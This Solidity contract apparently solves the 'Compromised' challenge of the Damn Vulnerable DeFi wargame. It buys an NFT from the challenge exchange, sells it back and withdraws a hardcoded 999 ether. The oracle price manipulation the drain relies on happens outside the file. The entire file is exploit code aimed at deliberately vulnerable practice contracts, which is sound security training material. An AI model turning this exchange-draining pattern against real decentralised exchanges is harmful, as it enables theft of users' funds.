// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../compromised/Exchange.sol";
import "../compromised/TrustfulOracle.sol";
import "../DamnValuableNFT.sol";

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract AttackCompromised is IERC721Receiver {
    Exchange exchange;
    TrustfulOracle oracle;
    DamnValuableNFT token;

    uint256 id;

    constructor(address _exchange, address _oracle, address _token) {
        exchange = Exchange(payable(_exchange));
        oracle = TrustfulOracle(_oracle);
        token = DamnValuableNFT(_token);
    }

    function buy() public {
        id = exchange.buyOne{value: 0.01 ether}();
    }

    function getPrice() public view returns (uint256) {
        return oracle.getMedianPrice(token.symbol());
    }

    function deposit() external payable {
        require(msg.value >= 0.01 ether);
    }

    function sell() public {
        token.approve(address(exchange), id);
        exchange.sellOne(id);
    }

    function withdraw(address _to) public {
        uint256 amount = 999 ether;
        payable(_to).transfer(amount);
    }

    function getId() public view returns (uint256) {
        return id;
    }

    function getContractAmount() public view returns (uint256) {
        return address(this).balance;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
